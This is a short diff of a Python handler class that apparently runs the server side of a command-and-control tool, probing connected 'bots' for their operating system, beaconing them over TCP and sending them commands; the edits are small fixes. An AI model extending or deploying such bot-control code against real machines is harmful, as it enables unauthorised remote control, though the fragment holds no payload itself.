@@ -110,10 +110,10 @@ class Handler(threading.Thread):
 
     def setOS(self):
         os_code = self.execute(self.os_probe, True)
-        print(os_code)
-        if os_code == self.reply_values["windows"]:
+        # print(os_code)
+        if self.reply_values["windows"] in os_code:
             self.os = "Windows"
-        elif os_code == self.reply_values["linux"]:
+        elif self.reply_values["linux"] in os_code:
             self.os = "Linux"
         else:
             self.os = "Error"
@@ -144,7 +144,7 @@ class Handler(threading.Thread):
 
     def getReply(self, probe):
         return self.reply_values[probe]
-        
+
     def getTT(self):
         return self.transport_type
 
@@ -212,7 +212,7 @@ class Handler(threading.Thread):
             if not self.beacon_wait:            # If not in mode that could jumble up the output to and from the agent with the beacons, because if we're in that mode then we know its beaconing already
                 if self.transport_type == "TCP":
                     try:
-                        msg = self.execute("beacon", True)
+                        msg = self.execute("beacon-probe", True)
                         
                         if self.reply_values["beacon"] in msg:
                             self.status[1] = "UP"
@@ -394,7 +394,7 @@ class Handler(threading.Thread):
                 self.client.send(cmd_sent.encode('utf-8'))
         except Exception as ex:
             # Log this - print to screen if not a beacon
-            if cmd_sent != self.beacon_probe:
+            if cmd_sent != "beacon-probe":
                 print(f"[* BotHandler-Msg:StdExec] Unable to send command to bot {self.agent_id} at {str(self.ip)}")
                 self.loggers[0].q_log('conn','info','[* BotHandler-Msg:StdExec] Unable to execute command on agent '+str(self.agent_id))
                 print(f"[* BotHandler-Msg:StdExec] Error: {ex}")
